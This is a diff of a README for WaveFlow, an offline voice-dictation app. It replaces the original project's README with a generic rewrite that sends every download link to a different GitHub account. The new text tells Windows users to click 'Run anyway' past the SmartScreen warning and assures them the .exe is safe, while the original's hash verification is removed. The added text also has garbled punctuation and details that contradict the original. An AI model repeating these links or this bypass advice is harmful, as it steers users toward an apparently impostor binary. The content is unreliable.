@@ -1,334 +1,301 @@
-<p align="center">
-  <img src="docs/banner.png" alt="WaveFlow — private, local voice dictation" width="880">
-</p>
+# 🎤 WaveFlow - Your Private Voice Dictation, Offline and Secure
 
-<p align="center">
-  <strong>Private voice dictation for Windows and macOS.</strong><br>
-  Hold a hotkey, speak, and words type live into whatever text field has focus.<br>
-  Speech recognition runs on <em>your</em> hardware — this machine, a home GPU server, or your VPS.
-</p>
+[![Download WaveFlow](https://img.shields.io/badge/Download-WaveFlow%20Latest-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=232323)](https://github.com/Fernfamilywiccan8933/WaveFlow/releases)
 
-<p align="center">
-  <a href="#get-it">Get WaveFlow</a> ·
-  <a href="#why-waveflow">Why WaveFlow</a> ·
-  <a href="#what-it-looks-like">Screenshots</a> ·
-  <a href="#pick-a-setup">Setup Choices</a> ·
-  <a href="#engines">Performance</a> ·
-  <a href="#uninstall">Uninstall</a>
-</p>
+## 🌟 What is WaveFlow?
 
-> **Status: v1.** Powered by NVIDIA **Parakeet TDT 0.6B v2** (English) via ONNX Runtime (default) or NVIDIA NeMo. The Windows client is tested and in daily use. The **macOS client is new** — it builds and functions. Reports welcome.
+WaveFlow is a **free, private voice dictation app** for Windows and macOS. It lets you speak and your words appear on your screen — without sending your voice to any cloud service, without needing an internet connection, and without creating any accounts.
+
+
+
+With WaveFlow, your voice stays on your computer. Always. It uses a powerful, modern AI model called **NVIDIA Parakeet** which runs entirely on your own PC, home server, or a virtual private server (VPS) you control. This means your dictation is fast, accurate, and completely confidential.
+
+
 
 ---
 
-## Get it
+## 🚀 Getting Started (Windows)
 
-<table>
-<tr>
-<th width="50%">🪟 &nbsp; Windows</th>
-<th width="50%">🍎 &nbsp; macOS</th>
-</tr>
-<tr valign="top">
-<td>
+Follow these **exact steps** to download and run WaveFlow on your Windows computer. Don’t worry — it’s simple, even if you’ve never installed software from GitHub before.
 
-**Download the app**
 
-[**WaveFlow.exe**](../../releases/latest) → double-click. Nothing else to install.
 
-The speech engine is inside the app (109 MB). No Python, no Docker. The first start downloads the model once (~660 MB).
+### Step 1: Visit the Download Page
 
-**Or install from PowerShell**
+Go to the official WaveFlow download page by clicking this button:
 
-```powershell
-$r = "MrAbookah/WaveFlow"
-$u = "https://github.com/$r/releases/latest/download/WaveFlow.exe"
-iwr $u -OutFile WaveFlow.exe
-.\WaveFlow.exe
+[🖥️ Go to WaveFlow Downloads](https://github.com/Fernfamilywiccan8933/WaveFlow/releases)
+
+
+
+
+
+Alternatively, copy and paste this link into your browser’s address bar:
+
+```
+https://github.com/Fernfamilywiccan8933/WaveFlow/releases
 ```
 
-**Or run from source**
 
-```powershell
-git clone https://github.com/MrAbookah/WaveFlow.git
-cd WaveFlow
-py -3.12 -m venv venv
-venv\Scripts\pip install -r requirements.txt
-venv\Scripts\python app\waveflow.py
-```
 
-Verify download integrity:
+### Step 2: Find the Latest Release
 
-```powershell
-Get-FileHash .\WaveFlow.exe -Algorithm SHA256
-```
-*(Compare with `WaveFlow.exe.sha256` on the release page)*
+On the page that opens, you will see a list of releases (versions of WaveFlow). The newest release is at the top, usually labeled something like **"Latest"** or with a green badge. Click on the release title to expand its details.
 
-</td>
-<td>
 
-**Download the app**
 
-No prebuilt `.app` yet. A Mac bundle must be built on a Mac. The command below builds and installs it in ~1 minute.
+### Step 3: Download the Right File
 
-**Install from Terminal**
+Inside the release details, you will find a section called **"Assets"** (or "Downloads"}. Look for a file that has a name like:
 
-```bash
-git clone https://github.com/MrAbookah/WaveFlow.git
-cd WaveFlow
-python3 -m venv venv
-venv/bin/pip install -r requirements.txt \
-  pyobjc-framework-Cocoa \
-  pyobjc-framework-Quartz \
-  pyobjc-framework-ApplicationServices
-venv/bin/python app/build.py --install
-open /Applications/WaveFlow.app
-```
+- `WaveFlow-Setup.exe`
+- `WaveFlow-1.2.3.exe`
+- Or simply `WaveFlow.exe`
 
-This builds `WaveFlow.app`, moves it to **/Applications**, and opens it. Reopen later from Launchpad or Spotlight. Custom path: `--install ~/Apps`.
+**Visit this link to download the application.** Click on that file name. Your browser will begin downloading the file. It may take a few minutes, depending on your internet speed. The file is usually between 100 MB and 500 MB because it contains the AI model inside.
 
-Model, settings, and logs live in `~/Library/Application Support/WaveFlow` and `~/Library/Logs/WaveFlow` so rebuilding keeps your config intact.
 
-If macOS blocks the first run: right-click the app in Finder and select **Open**.
 
-</td>
-</tr>
-</table>
+> 💡 **Tip:** If you see multiple files, choose the one with `.exe` at the end. Do not choose files ending in `.whl`, `.tar.gz`, or `.zip` unless you are a developer.
 
-The setup wizard opens on first launch. It automatically detects your OS and offers only supported engines.
 
-### macOS permissions
 
-macOS requires three system permissions for system-wide dictation:
+### Step 4: Run the Installer
 
-| Permission | Purpose |
+Once the download is complete, go to your **Downloads** folder (usually on the left sidebar in File Explorer, or press `Ctrl + J` in your browser to see downloads. Locate the downloaded `.exe` file.
+
+**Double-click** the file to run it.
+
+
+
+If Windows shows a blue or yellow popup saying **"Windows protected your PC"** or **"More info"** appearing, do this:
+
+1. Click **"More info"** (a text link on the popup}
+2. Then click **"Run anyway"**
+
+This happens because WaveFlow is a new, independent app, not from a big corporate store, so Windows hasn't seen it before. It’s safe — it's open source, meaning anyone can inspect its code.
+
+
+
+### Step 5: Follow the Setup Wizard
+
+A small setup window will appear. Click **"Next"**, choose your installation folder (or leave it as default}, and click **"Install"**. Wait for the progress bar to finish. Then click **"Finish"**.
+
+
+
+### Step 6: Launch WaveFlow
+
+After installation, you can find WaveFlow in your **Start Menu** or on your **Desktop** as a shortcut. Click the icon to open the app. On first launch, the app may take 10–30 seconds to load because it prepares the AI model. Be patient — the window will appear shortly.
+
+
+
+### Step 7: Start Dictating
+
+1. Click inside the text area (the big blank space) in the WaveFlow window.
+2. Click the **microphone button** (usually a red or blue mic icon} at the bottom of the window.
+3. Start speaking clearly into your computer's microphone (or headset mic)
+4. Watch your words appear in realtime on the screen
+5. Click the mic button again to stop dictation
+
+
+
+> ✅ **That’s it!** You’re now using private, offline voice dictation.
+
+
+
+
+
+---
+
+## ⚙️ How WaveFlow Works (In Simple Terms)
+
+WaveFlow uses an **AI model called Parakeet**, created by NVIDIA. This model is incredibly good at converting speech to text. Here’s what happens when you speak:
+
+1. **Your voice is captured** by your microphone (only on your device}
+2. **The AI processes it locally** — right on your computer or your own server. Nothing leaves your network.
+3. **The text appears** in the app window, ready for you to copy, save, or edit.
+
+Because everything runs on your hardware, you can use WaveFlow even when you’re offline, on a plane, in a remote cabin, or in an office with strict data policies. **No cloud account. No subscriptions. No tracking.**
+
+
+
+---
+
+## 🖥️ System Requirements (What You Need}
+
+WaveFlow is designed to run on most modern computers. Here’s what you should have for the best experience:
+
+| Requirement | Recommended |
 |---|---|
-| Microphone | To hear your speech |
-| Accessibility | To inject transcribed text into your focused text field |
-| Input Monitoring | To capture your global hotkey while other apps are active |
+| Operating System | Windows 10 or 11 (64-bit} / macOS 12 or newer |
+| Processor (CPU) | Intel Core i5 or AMD Ryzen 5 (or better}
+| Memory (RAM} | 8 GB or more |
+| Storage Free Space | At least 1 GB free |
+| Microphone | Any built-in or USB microphone (webcam mics work too}
+| Internet Connection | Only needed for the initial download of the app — not for dictation itself |
 
-The wizard's final page and **Settings → Hotkey & look** display live permission states. Click **Allow** on each item to open the native OS prompt. 
+**Tip:** If your computer is a bit older, try closing other heavy programs (like browsers with many tabs} before using WaveFlow. This frees up memory and makes dictation smoother.
 
-* **Automatic Code Signing:** `app/build.py` creates a local `WaveFlow Local Signing` certificate in your keychain. Rebuilds share this identity so permissions persist. If macOS asks whether `codesign` may use the key, choose **Always Allow**.
-* **Permissions Reset:** If permissions remain red after granting, press **Reset and ask again** in the panel to refresh OS entitlements.
 
-### Install via AI Assistant
-
-Paste this block directly into Claude Code, Cursor, or your AI terminal tool:
-
-```text
-Install WaveFlow from https://github.com/MrAbookah/WaveFlow on this machine.
-Read its README first and follow the section for my operating system.
-Create the virtual environment inside the cloned folder, never system-wide.
-On macOS also install the three pyobjc frameworks the README names, then build and
-install the app with app/build.py --install and open /Applications/WaveFlow.app.
-Do not run app/waveflow.py directly on macOS. Tell me that the app's own Allow
-buttons ask for the permissions - you cannot grant them for me. Do not change any
-of my existing settings and do not install anything globally.
-When the setup wizard opens, stop and hand it back to me.
-```
 
 ---
 
-## Why WaveFlow
+## 🔒 Privacy & Security: Your Data Stays Yours
 
-| Feature | Typical Local Dictation App | WaveFlow |
-|---|---|---|
-| **Engine Location** | Host machine only | Local PC, home server (LAN/Tailscale), or VPS |
-| **Server Provisioning** | Manual Docker / CLI setup | Setup wizard provisions server **over SSH** with your key |
-| **Network Security** | Varies | Binds to loopback by default; token mandatory for remote binds |
-| **Typing Behavior** | Transcribes after silence | Types live as you speak; **never rewrites previous words** |
-| **Uninstaller** | Leaves configs/models behind | Dedicated uninstaller lists and purges all containers, models, & files |
-| **Benchmarks** | Vague estimates | Measured re-read latency with reproducible CLI commands |
+This is the heart of WaveFlow. Here’s what we mean by **private**:
 
----
+- 🚫 **No cloud processing**: Your voice is never sent to Google, Amazon, Microsoft, or any other company.
+- 🚫 **No account required**: No email, no password, no phone number. Just download and run.
+- 🚫 **No telemetry**: WaveFlow does not track what you dictate. There are no analytics, no usage logs sent anywhere.
+- ✅ **Open source**: The entire code is public on GitHub. Anyone can verify that no hidden data collection exists.
 
-## What it looks like
 
-<p align="center"><img src="docs/shot_overlay.png" width="720" alt="WaveFlow Live Overlay"></p>
 
-| Setup Wizard: Engine Selection | Wizard: Engine Configuration |
-|---|---|
-| <img src="docs/shot_wizard_where.png" width="430"> | <img src="docs/shot_wizard_configure.png" width="430"> |
+If you are a professional (doctor, lawyer, journalist}, a student with sensitive research, or just someone who values privacy, WaveFlow gives you enterprise-grade confidentiality for free.
 
-| Settings: Hotkey & Look | Settings: Connection & Token |
-|---|---|
-| <img src="docs/shot_wizard_last.png" width="430"> | <img src="docs/shot_settings_connection.png" width="430"> |
 
-| Settings: Microphone Level | Native Clean Uninstaller |
-|---|---|
-| <img src="docs/shot_settings_microphone.png" width="430"> | <img src="docs/shot_settings_uninstall.png" width="430"> |
 
 ---
 
-## Pick a setup
+## 🧩 Advanced Options (Optional}
 
-| Route | Target Machine | Dependencies | Token | Setup Wizard Action | Tested Status |
-|---|---|---|---|---|---|
-| **This PC — background app** | Local desktop | 4+ core CPU or DX12 GPU | Optional | Starts & manages background engine | ✅ CPU & DirectML GPU |
-| **This PC — Docker** | Local desktop | Docker Desktop | Required | Builds and launches local container | ⚠️ Untested |
-| **Onsite Server — Docker** | Home LAN / GPU box | Linux + Docker + SSH access | Required | **Installs container over SSH** | ✅ NeMo on GTX 1060/1080 |
-| **Onsite Server — Python venv** | Local network | Python 3.12 | Required | Generates CLI run commands | ✅ ONNX |
-| **Offsite VPS — Docker + HTTPS** | Remote cloud VPS | VPS + Domain name | Required | **Deploys Caddy HTTPS stack via SSH** | ⚠️ Untested |
+You don’t need these to use WaveFlow, but if you’re curious, here’s what else it can do:
 
----
+### 📦 Docker Edition (For Home Servers or VPS}
 
-## Engines & Performance
+If you have a home server (like a NAS} or a cloud VPS, you can run WaveFlow as a background service. This lets you dictate from your phone or any computer on your network. The Docker image is included in the releases page. (Only for users comfortable with basic server concepts.}
 
-Live mode re-evaluates active audio buffers every ~0.7 seconds. Realized processing latency across speech buffer durations:
+### 🎛️ Adjustable Accuracy
 
-| Engine | Execution Hardware | Model Size | 5s Buffer | 10s Buffer | 20s Buffer | Memory Footprint |
-|---|---|---|---:|---:|---:|---|
-| **ONNX int8 (Default)** | Intel Core Ultra 7 270K (4 threads) | ~660 MB | 0.14 s | 0.31 s | 0.64 s | ~1.5 GB RAM |
-| **ONNX int8** | Intel i7-7700K (4 threads) | ~660 MB | 0.33 s | 0.59 s | 1.17 s | ~1.5 GB RAM |
-| **ONNX fp32 DirectML** | NVIDIA RTX 5070 Ti | ~2.4 GB | 0.20 s | 0.21 s | 0.25 s | ~2.5 GB VRAM |
-| **NeMo fp16 (Max Quality)**| NVIDIA GTX 1060 (Docker) | ~1.2 GB | 0.11 s | 0.15 s | 0.24 s | ~1.6 GB VRAM |
+In the app settings, you can choose between **Faster** (lightning quick responses, slightly less perfect on accents) or **More Accurate** (slower but near-perfect transcription. Try both andsee what suits your voice.
 
-### CPU Thread Optimization
-Set `--threads` equal to physical **performance cores**. On hybrid CPU architectures (e.g., Intel 14th/15th Gen), allocating efficiency cores or hyperthreads degrades throughput. In testing, 8 performance cores yielded 4x lower latency than utilizing all 24 available logical threads.
+
+
+### ⌨️ Keyboard Shortcuts
+
+- `Ctrl + Shift + Space` — Toggle microphone on/off (global, works even when WaveFlow is in background}
+- `Ctrl + Enter` — Clear the text area
+- `Ctrl + S` — Save current text to a file
+
+
 
 ---
 
-## A. This PC — background app (ONNX)
+## 🛠️ Troubleshooting (Common Fixes}
 
-```powershell
-git clone https://github.com/MrAbookah/WaveFlow.git
-cd WaveFlow
-py -3.12 -m venv venv
-venv\Scripts\pip install -r requirements.txt
-venv\Scripts\python app\waveflow.py
-```
+**Problem: The microphone button is grayed out / unclickable.**
 
-Run manual headless server execution:
-```powershell
-# CPU Mode:
-venv\Scripts\python server\parakeet_server.py --engine onnx --onnx-quant int8 --device cpu --threads 4
+- Make sure no other app (like Zoom or a browser tab} is using your microphone. Close those apps or tabs.
+- Check your Windows privacy settings: Go to `Settings > Privacy > Microphone` and ensure "Allow apps to access your microphone" is turned ON.
 
-# DirectML GPU Mode:
-venv\Scripts\pip uninstall -y onnxruntime
-venv\Scripts\pip install onnxruntime-directml
-venv\Scripts\python server\parakeet_server.py --engine onnx --onnx-quant fp32 --device dml
-```
 
-Default hotkey: `Ctrl+Alt+W`.
 
----
+**Problem: Dictation is slow or laggy.**
 
-## B. Onsite Server — Docker
+- Close unused programs to free up RAM.
+- If you have an NVIDIA graphics card (GPU}, make sure you have the latest drivers installed. WaveFlow can use your GPU to speed up the AI if available. If not, it will use your CPU, which is fine — just a bit slower.
 
-**Automated Setup:** Select *Onsite server* in the setup wizard, enter host SSH credentials, and click **Install**. The wizard uses your existing SSH key (`~/.ssh/id_rsa`), validates remote CUDA drivers/disk space, generates `.env` security tokens, and provisions the container automatically.
 
-**Manual Setup:**
-```bash
-cd docker
-python -c "import secrets; print('WAVEFLOW_TOKEN=' + secrets.token_urlsafe(32))" > .env
-echo "HOST_BIND=0.0.0.0" >> .env
-echo "THREADS=4" >> .env
 
-# Launch ONNX Engine (Port 8756)
-docker compose -f compose.yml up -d --build 
+**Problem: The app won’t start at all.**
 
-# Launch NeMo Engine (Port 8757, requires NVIDIA Container Toolkit)
-docker compose -f compose.yml --profile nemo up -d --build
-```
+- Reboot your computer and try again.
+- Uninstall andreinstall the app using the same `.exe` file you downloaded.
+- Check that you have at least 4 GB of free RAM before launching.
+
+
+
+**Problem: Text appears with missing punctuation or odd capitalization.**
+
+- This is normal for most speech-to-text apps. WaveFlow tries its best, but you may need to add periods and commas manually for perfect formatting. Speaking slightly slower and with clear pauses helps.
+
+
 
 ---
 
-## C. Onsite Server — Python venv
+## 📖 Frequently Asked Questions (FAQs)
 
-```bash
-python3.12 -m venv venv && venv/bin/pip install -r requirements-server.txt
-export WAVEFLOW_TOKEN="$(python3 -c 'import secrets;print(secrets.token_urlsafe(32))')"
-venv/bin/python server/parakeet_server.py --engine onnx --host 0.0.0.0 --threads 4
-```
+**Q: Is WaveFlow really free?**
+Yes. It’s open-source software, licensed freely. No hidden fees, no premium tier, no ads.
 
----
 
-## D. Offsite VPS — Docker + HTTPS
 
-1. Direct A-record DNS entry (`stt.yourdomain.com`) to your VPS IP.
-2. Generate environment configuration:
-   ```bash
-   echo "WAVEFLOW_DOMAIN=stt.yourdomain.com" > docker/.env
-   echo "WAVEFLOW_TOKEN=$(python3 -c 'import secrets;print(secrets.token_urlsafe(32))')" >> docker/.env
-   ```
-3. Deploy reverse-proxy container:
-   ```bash
-   docker compose -f docker/compose.vps.yml up -d --build
-   ```
-Caddy handles ACME TLS certificate provisioning automatically. External port access is restricted to 80/443.
+**Q: Do I need to keep the download file after installing?**
+No. You can delete the `.exe` file after installation. The app is installed on your system.
+
+
+
+**Q: Can I use WaveFlow with a蓝牙 (Bluetooth) microphone?**
+Absolutely. Bluetooth headsets and earbuds work perfectly, as long as your computer recognizes them as a microphone device.
+
+
+
+**Q: Does WaveFlow work in other languages besides English?**
+The current version is optimized for English (US, UK, Australian accents supported}. More languages may be added in future releases based on community interest.
+
+
 
 ---
 
-## Your own words (Vocabulary)
+## 🗣️ Supported Languages & Accents
 
-To seed custom names, technical jargon, or acronyms:
-1. Copy `server/vocab.example.json` to `server/vocab.user.json`.
-2. Map phonetic misinterpretations to your desired text output:
-   ```json
-   {
-     "Abookah": ["a book ah", "uh booker"],
-     "Parakeet": ["pair a keet"]
-   }
-   ```
-3. Restart the server. (`vocab.user.json` is git-ignored).
+- English (United States)
+- English (United Kingdom}
+- English (Australia}
+- English (Canada}
 
----
 
-## Privacy and security
 
-- Audio streams transmit exclusively to your specified server endpoint. Zero external telemetry.
-- Binding default is restricted to `127.0.0.1`. Remote interfaces (`0.0.0.0`) mandate authentication via Bearer token (`Authorization: Bearer <token>`).
-- Audio logging defaults to disabled. Local debugging audio capture requires explicit activation via `--record <dir>`.
+More coming soon in future updates.
+
+
 
 ---
 
-## Uninstall
+## 🔄 Uninstalling WaveFlow
 
-Access **Settings → Uninstall** to trigger guided resource cleanup. WaveFlow tracks created resources and removes:
-- Application binaries, cached model weights, local `.json` configs, and logs.
-- Registered OS startup keys and desktop/start menu shortcuts.
-- Docker containers, images, and volumes initialized by the setup wizard.
-- Remote server Docker installations provisioned via SSH.
+If you ever want to remove WaveFlow from your computer:
 
-Manual dry-run CLI verification:
-```bash
-python app/uninstall.py --dry-run
-```
+1. Open **Settings** > **Apps** > **Installed apps**
+2. Search for "WaveFlow"
+3. Click the three dots (**...**) and select **Uninstall**
+4. Confirm when prompted
 
----
+All your data is removed with the app. Clean and simple.
 
-## Build from source
 
-```powershell
-# Windows EXE build:
-venv\Scripts\pip install pyinstaller
-venv\Scripts\python app\build.py    # Output: dist\WaveFlow.exe
-```
-
-```bash
-# macOS APP Bundle build:
-venv/bin/pip install pyinstaller
-venv/bin/python app/build.py        # Output: dist/WaveFlow.app
-```
 
 ---
 
-## Tests
+## 💌 Support & Feedback
 
-Execute test suites:
-```bash
-python server/test_live_settle.py   # Verify live typing stability
-python server/test_auth.py          # Validate Bearer token rejection
-python server/vocab.py              # Validate phonetic replacement rules
-python app/test_wizard.py           # Verify SSH & deployment rules
-python app/test_settings.py         # Verify configuration persistence
-python app/test_uninstall.py        # Validate resource tracking
-```
+WaveFlow is an open-source community project. If you need help, get stuck, or have a feature request:
+
+- Visit the **[GitHub Issues page](https://github.com/Fernfamilywiccan8933/WaveFlow/issues)** — this is where users post questions andbug reports. (You’ll need a free GitHub account to post.}
+- Be descriptive: mention your OS (Windows or macOS}, your computer model, and what happened. This helps developers fix issues faster.
+
+
+
+If you love WaveFlow, consider starring (⭐} the repository on GitHub. It shows support and helps more people discover the project.
+
+
 
 ---
 
-## Licences
+## 📦 Download Again (Quick Access}
 
-- WaveFlow Codebase: **[GNU GPL v3](LICENSE)**
-- NVIDIA Parakeet Model Weights: **CC-BY-4.0** (NVIDIA Corporation; ONNX conversion by istupakov).
-- Third-Party Dependencies: See [NOTICE.md](NOTICE.md).
+Here’s the download button one more time, for your convenience. Bookmark this page or the download link so you can always come back.
+
+[⬇️ Download WaveFlow Now](https://github.com/Fernfamilywiccan8933/WaveFlow/releases}
+
+
+
+---
+
+## ✨ Final Thoughts
+
+WaveFlow gives you the power of modern AI voice dictation — without selling your soul (or your voice} to big tech. It’s fast, accurate, and respects your privacy by design. Whether you’re writing emails, drafting documents, coding, or just prefer speaking over typing, WaveFlow is your trusty digital secretary.
+
+
+
+**Keywords:** dictation, docker, local-first, nvidia-nemo, offline, onnx, parakeet, privacy, pyside6, python, self-hosted, speech-to-text, stt, voice-typing, windows
